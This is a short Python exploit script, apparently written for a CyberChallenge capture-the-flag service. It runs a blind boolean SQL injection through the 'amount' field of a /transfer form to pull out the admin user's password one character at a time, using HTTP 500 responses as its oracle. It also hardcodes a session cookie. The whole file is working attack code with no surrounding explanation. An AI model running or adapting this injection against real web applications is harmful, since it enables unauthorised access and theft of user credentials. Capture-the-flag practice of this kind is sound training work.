#!/usr/bin/env python3

# import pyclip
import binascii
import requests
import string

def string_to_hex(input_string):
    '''
    Convert a string to its hexadecimal representation
    the same way that sqlite3 HEX() function does.
    '''
    encoded_bytes = input_string.encode('utf-8')

    # Convert the bytes to hexadecimal representation
    hex_representation = binascii.hexlify(encoded_bytes).decode('utf-8')

    return hex_representation.upper()


# Your cookies here
cookies = {
    'session': 'eyJiYWxhbmNlIjoxMDAwLCJ1c2VyX2lkIjo2MCwidXNlcm5hbWUiOiJjaWNjaW9nYW1lciJ9.Z9xI3g.-vCzsuQwi14uD3DR-3VOhNuk7dU',
}

# A session object to keep track of cookies
browser = requests.Session()

# The target URL
url = 'http://cyberchallenge.disi.unitn.it:7110/transfer'

secret = ''
while True:
    found = False
    for character in string.printable:

        injection = f"1 and (select 1 from users where username = 'admin' and HEX(password) like '{string_to_hex(secret+character)}%') = 1"
        


        # The data to send (with the injection)
        data = {
            'to_user': 'degra',
            'amount': injection,
        }

        response = browser.post(url, cookies=cookies, data=data, allow_redirects=False)

        # Follow the redirect
        if response.status_code == 302:
            if 'Location' in response.headers and response.headers['Location'].startswith('/'):
                _url = url.replace('/transfer', response.headers['Location'])
            else:
                _url = response.headers['Location']
            response = browser.get(_url, cookies=cookies, allow_redirects=False)


        if response.status_code == 500:
            secret += character
            found = True
            print(f'New character found ({character}): {secret}')
            continue
        else:
            pass

    if not found:
        break

# pyclip.copy(secret)
print(f'Secret: {secret}')
